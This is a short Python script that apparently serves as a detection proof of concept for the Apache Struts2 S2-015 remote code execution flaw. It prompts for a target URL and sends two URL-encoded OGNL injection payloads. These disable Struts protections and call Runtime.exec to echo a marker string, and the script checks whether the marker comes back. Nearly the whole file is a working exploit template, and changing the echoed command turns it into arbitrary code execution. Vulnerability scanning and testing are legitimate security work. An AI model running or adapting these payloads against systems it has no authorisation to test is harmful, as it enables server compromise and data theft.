import re
import requests
import urllib


def s2_015(url):
    relsult = {
        'name': 'S2-015 Remote Code Execution Vulnerablity',
        'vulnerable': False
    }
    try:
        flag = 'e5e67yds88291hshzqml9s0'
        payload1 = r'/%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27echo%20e5e67yds88291hshzqml9s0%27%29.getInputStream%28%29%29%2C%23q%7D.action'
        payload2 = r'/%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27e5e67yds88291hshzqml9s0%27%29.getInputStream%28%29%29%2C%23q%7D.action'
        vulurl1 = urllib.parse.urljoin(url, payload1)
        vulurl2 = urllib.parse.urljoin(url, payload2)

        req1 = requests.get(vulurl1, timeout=3)
        req2 = requests.get(vulurl2, timeout=3)
        if re.search(flag, req1.text):
            if re.search(flag, req2.text) and len(req2.text) < len (req1.text):
                pass
            else:
                relsult['vulnerable'] =True
                relsult['method'] = 'GET'
                relsult['url'] = url
                relsult['payload'] = vulurl1
        return relsult

    except:
        return relsult


if __name__ == '__main__':
    url = input('输入目标URL:')
    print(s2_015(url))